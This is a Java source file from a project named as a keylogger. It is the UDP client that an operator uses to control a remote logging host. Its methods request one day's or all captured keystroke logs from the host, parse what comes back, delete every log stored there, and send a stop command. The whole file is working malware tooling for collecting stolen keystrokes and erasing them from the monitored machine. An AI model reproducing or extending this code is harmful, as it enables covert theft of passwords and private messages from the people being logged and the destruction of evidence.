package com.hao.keylogger.controllers.Client;

import java.io.IOException;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.net.SocketException;
import java.net.SocketTimeoutException;
import java.net.UnknownHostException;
import java.text.ParseException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;

import com.hao.keylogger.models.Log;
import com.hao.keylogger.models.Resources;

public class UDPClientHelper {
	public enum ReceiveMode {
		GET_LOG, GET_MSG
	}

	private static UDPClientHelper instance;

	private DatagramSocket socket;
	private InetAddress hostAddress;
	private String hostName;
	private int hostPort;
	ClientLogController controller;
	Thread receiverThread;
	
	ReceiveMode receiveMode;

	byte[] buffer = new byte[Resources.CLIENT_BUFFER_SIZE];

	/**
	 * Create new socket
	 * 
	 * @param inetAddress
	 * @param port
	 * @throws SocketException
	 * @throws UnknownHostException
	 */
	public UDPClientHelper(ClientLogController controller, InetAddress inetAddress, int port)
			throws SocketException, UnknownHostException {
		socket = new DatagramSocket();
		socket.setSoTimeout(Resources.TIME_OUT);
		hostAddress = inetAddress;
		this.hostPort = port;
		this.controller = controller;
		receiverThread = new Thread(new PacketReceiver());
	}

	public DatagramSocket getSocket() {
		return socket;
	}

	public void setSocket(DatagramSocket socket) {
		this.socket = socket;
	}

	public InetAddress getAddress() {
		return hostAddress;
	}

	public void setAddress(InetAddress address) {
		this.hostAddress = address;
	}

	public String getHostName() {
		return hostName;
	}

	public void setHostName(String hostName) {
		this.hostName = hostName;
	}

	public int getPort() {
		return hostPort;
	}

	public void setPort(int port) {
		this.hostPort = port;
	}

	public static String getLocalHostIP() {
		try {
			return InetAddress.getLocalHost().getHostAddress();
		} catch (UnknownHostException e) {
			e.printStackTrace();
			return "";
		}
	}

	/**
	 * fetch a single log by specified date
	 * 
	 * @param date
	 * @return Log
	 */
	public void fetchLog(Date date) {
		receiveMode = ReceiveMode.GET_LOG;
		String dateStr = new SimpleDateFormat("d-M-yyyy").format(date);

		String msg = Resources.FETCH_LOG_REQUEST + "?" + dateStr;

		DatagramPacket outPacket = new DatagramPacket(msg.getBytes(), msg.length(), hostAddress, hostPort);
		try {
			socket.send(outPacket);
		} catch (IOException e) {
			e.printStackTrace();
		}

		// waiting for the server message, pass the log to controller when it is
		// fetched
		receiverThread.start();
	}

	/**
	 * get all logs stored on host
	 * 
	 * @return
	 */
	public void fetchAllLogs() {
		receiveMode = ReceiveMode.GET_LOG;
		String msg = Resources.FETCH_ALL_LOG_REQUEST + "?";
		DatagramPacket outPacket = new DatagramPacket(msg.getBytes(), msg.length(), hostAddress, hostPort);
		try {
			socket.send(outPacket);
		} catch (IOException e) {
			e.printStackTrace();
		}

		// waiting for the server message, pass the log to controller when it is
		// fetched
		receiverThread.start();
	}

	/**
	 * Receive packet from server
	 * 
	 * @author Hao Svit
	 *
	 */
	private class PacketReceiver implements Runnable {
		@Override
		public void run() {
			try {
				switch (receiveMode) {
				case GET_LOG: 
					getLog();
					break;
				case GET_MSG:
					getMessage();
					break;
				}
				// end switch
			} catch (Exception ex) {
				ex.printStackTrace();
			}

		}

		private void getMessage() {
			String msg = receivePacket();
			controller.receiveMessageFromServer(msg);
		}

		private void getLog() throws ParseException {
			// get number of logs
			int numOfLogs = Integer.parseInt(receivePacket());

			ArrayList<Log> logs = new ArrayList<Log>();
			for (int i = 0; i < numOfLogs; i++) {
				String dateOfLogStr = receivePacket();
				Date dateOfLog = new SimpleDateFormat("d-M-yyyy").parse(dateOfLogStr);

				String logContent = receivePacket();

				Log log = new Log();
				log.setDateOfLog(dateOfLog);
				log.setHost(hostAddress);
				log.setPort(hostPort);
				log.setContent(logContent);
				logs.add(log);
			}
			// pass the log back to controller
			controller.receiveLogFromServer(logs);
		}

		private String receivePacket() {
			DatagramPacket inPacket = new DatagramPacket(buffer, buffer.length);
			String receiveMsg = "";
			try {
				socket.receive(inPacket);
				receiveMsg = new String(inPacket.getData(), 0, inPacket.getLength());
			} catch (SocketTimeoutException e) {
				controller.receiveMessageFromServer(e.getMessage());
			} catch (IOException ex) {
				ex.printStackTrace();
			} 
			return receiveMsg;
		}
	}

	public void deleteAllHostLogs() {
		receiveMode = ReceiveMode.GET_MSG;
		String msg = Resources.DELETE_ALL_HOST_LOGS + "?";
		DatagramPacket outPacket = new DatagramPacket(msg.getBytes(), msg.length(), hostAddress, hostPort);
		try {
			socket.send(outPacket);
		} catch (IOException e) {
			e.printStackTrace();
		}
		//start listening
		receiverThread.start();
	}

	public void stopLogger() {
		receiveMode = ReceiveMode.GET_MSG;		
		String msg = Resources.STOP_LOGGER + "?";		
		DatagramPacket outPacket = new DatagramPacket(msg.getBytes(), msg.length(), hostAddress, hostPort);
		try {
			socket.send(outPacket);
		} catch (IOException e) {
			e.printStackTrace();
		}
		receiverThread.start();
	}
}
